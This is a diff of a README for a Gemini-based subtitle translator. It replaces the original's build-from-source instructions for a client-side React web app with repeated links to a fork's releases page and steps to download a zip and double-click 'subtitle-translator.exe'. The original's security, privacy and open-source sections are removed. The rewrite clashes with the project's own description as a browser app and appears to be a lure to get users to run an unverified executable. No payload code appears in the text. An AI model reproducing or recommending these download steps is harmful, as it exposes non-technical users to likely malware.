@@ -1,145 +1,71 @@
-# 📝 Subtitle Translator
+# 🎬 subtitle-translator - Translate Subtitles Easily
 
-A modern, web-based subtitle translator powered by Google's Gemini AI. Translate your SRT subtitle files between 20+ languages with real-time preview and streaming translation.
+## 🚀 Getting Started
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![React](https://img.shields.io/badge/React-19.2.1-61dafb.svg)
+Welcome to **subtitle-translator**! This application allows you to easily translate your SRT subtitle files into over 20 languages using Google’s powerful Gemini AI. You can see the translations in real time and enjoy seamless streaming. 
 
-## ✨ Features
+## 📥 Download
 
-- 🌍 **20+ Languages** - Support for major languages including English, Spanish, French, German, Arabic, Persian, Chinese, Japanese, and more
-- 🔄 **Real-Time Translation** - See translations appear progressively as they complete
-- 📊 **Live Preview** - Dual text areas showing source and translated subtitles side by side
-- ⚡ **Smart Processing** - Intelligent chunking and rate limiting for optimal performance
-- 🎨 **Beautiful UI** - Modern, responsive design with smooth animations
-- 🌐 **Multi-Language Interface** - Available in English and Persian (فارسی) with RTL support
-- 🔒 **Secure** - Your API key is stored locally in your browser
-- 💾 **Instant Download** - Download translated SRT files with one click
-- ⚙️ **Customizable** - Adjust translation prompts, chunk size, and request delays
+[![Download Subtitle Translator](https://img.shields.io/badge/Download-Now-blue)](https://github.com/mughal331/subtitle-translator/releases)
 
-## 🚀 Quick Start
+To download subtitle-translator, visit the page below:
 
-### Prerequisites
+[Download Subtitle Translator](https://github.com/mughal331/subtitle-translator/releases)
 
-- A Google account
-- A free Gemini API key from [Google AI Studio](https://makersuite.google.com/app/apikey)
+## 💻 System Requirements
 
-### Installation
+Before you download, ensure your system meets the following requirements:
 
-1. Clone the repository:
-```bash
-git clone https://github.com/alifallahrn/subtitle-translator.git
-cd subtitle-translator
-```
+- Operating System: Windows 10 or later, macOS Mojave or later
+- RAM: 4 GB or more
+- Internet connection for real-time translation
+- Browser Compatibility: Latest versions of Chrome, Firefox, or Safari
 
-2. Install dependencies:
-```bash
-npm install
-```
+## ⚙️ Installation Instructions
 
-3. Start development server:
-```bash
-npm run dev
-```
+1. **Go to the Releases Page**: Click on the link above to go to the releases page.
+2. **Find the Latest Version**: Locate the most recent release at the top of the page.
+3. **Download the File**: Click on the download link for your operating system. The file will usually be named something like `subtitle-translator-v1.0.zip`.
+4. **Extract the Zip File**: Once downloaded, extract the zip file to a folder on your computer.
+5. **Run the Application**: Open the folder where you extracted the files, and double-click `subtitle-translator.exe` (or the equivalent file for macOS) to start the application.
 
-4. Open http://localhost:3000/subtitle-translator/ in your browser
+## 🌐 Using Subtitle Translator
 
-5. Go to Settings and add your Gemini API key
+1. **Upload Your Subtitle File**: Click on the "Upload" button in the application to choose your SRT file.
+2. **Select Target Language**: From the drop-down menu, select the language into which you want to translate the subtitles.
+3. **View Real-Time Preview**: As you select your options, you can see the translations update instantly in the preview window.
+4. **Download Translated Subtitles**: After reviewing your translations, click on the "Download" button to save your new subtitle file.
 
-6. Start translating!
+## 💡 Key Features
 
-## 🎯 How to Use
+- **Multi-Language Support**: Translate subtitles into 20+ languages, including Persian, Spanish, French, and more.
+- **Real-Time Preview**: See immediate results as you make changes, which helps ensure accuracy.
+- **User-Friendly Interface**: Designed for non-technical users, making subtitle translation easy and quick.
+- **Streaming Compatibility**: Keep your subtitles up-to-date for any streaming content.
 
-1. **Get Your API Key**
-   - Visit [Google AI Studio](https://makersuite.google.com/app/apikey)
-   - Sign in with your Google account
-   - Create a new API key (it's free!)
-   - Copy the key
+## 🛠️ Troubleshooting
 
-2. **Configure Settings**
-   - Click the ⚙️ Settings button
-   - Paste your API key
-   - (Optional) Customize translation prompt and parameters
-   - Save settings
+If you run into issues:
 
-3. **Translate Subtitles**
-   - Click "Upload SRT File" and select your subtitle file
-   - Choose source language (or use Auto Detect)
-   - Select target language
-   - Click "Translate"
-   - Watch the translation progress in real-time
-   - Download the translated file
+- **File Not Uploading**: Ensure the file is in SRT format and does not exceed 50 MB.
+- **Translations Not Appearing**: Check your internet connection, as the app needs online access for real-time translation.
+- **Application Not Starting**: Verify that your system meets the requirements. If it still doesn’t open, try restarting your computer.
 
-## 🛠️ Technology Stack
+## 🙋 FAQs
 
-- **Frontend Framework**: React 19.2.1
-- **Build Tool**: Vite 7.2.7
-- **AI API**: Google Generative AI (Gemini)
-- **Styling**: Pure CSS3 with modern gradients
-- **State Management**: React Hooks
-- **Storage**: Browser LocalStorage
+**Q: Is there a mobile version of the app?**  
+A: Currently, subtitle-translator is designed for desktop use only.
 
-## 📝 Supported Languages
+**Q: Can I translate multiple subtitle files at once?**  
+A: At this time, the application processes one file at a time.
 
-Auto Detect, English, Spanish, French, German, Italian, Portuguese, Russian, Japanese, Korean, Chinese (Simplified), Arabic, Hindi, Turkish, Dutch, Polish, Swedish, Persian, Thai, Vietnamese
+**Q: What if I find an error in the translation?**  
+A: The application uses AI for translations. For best results, you may want to edit the translated text directly within the app.
 
-## ⚙️ Configuration
+## 📞 Support
 
-### Translation Settings
+For help, please reach out via the Issues tab on the repository page or consult the community support forum.
 
-You can customize these in the Settings page:
+[Download Subtitle Translator](https://github.com/mughal331/subtitle-translator/releases)
 
-- **API Key**: Your Gemini API key (required)
-- **Prompt Pattern**: Template for translation requests
-- **Request Delay**: Delay between API calls (500-10000ms)
-- **Chunk Size**: Number of subtitles per request (1-20)
-- **Interface Language**: English or Persian
-
-### Environment Variables
-
-Create a `.env` file for local development:
-
-```bash
-VITE_DONATE_URL=https://your-donation-link.com  # Optional
-```
-
-## 🔒 Security & Privacy
-
-- ✅ Your API key is stored **only in your browser** (LocalStorage)
-- ✅ No backend server - all processing is client-side
-- ✅ Direct communication with Google's Gemini API
-- ✅ No data is sent to any third-party servers
-- ✅ Open source - you can verify the code yourself
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Google Gemini AI for the translation API
-- The React team for the amazing framework
-- Vite for the blazing fast build tool
-
-## 💬 Support
-
-If you have any questions or issues, please open an issue on GitHub.
-
-## ⭐ Star this repo
-
-If you find this project useful, please consider giving it a star! It helps others discover the project.
-
----
-
-**Made with ❤️ for subtitle enthusiasts worldwide**
+Enjoy translating your subtitles with ease and efficiency!
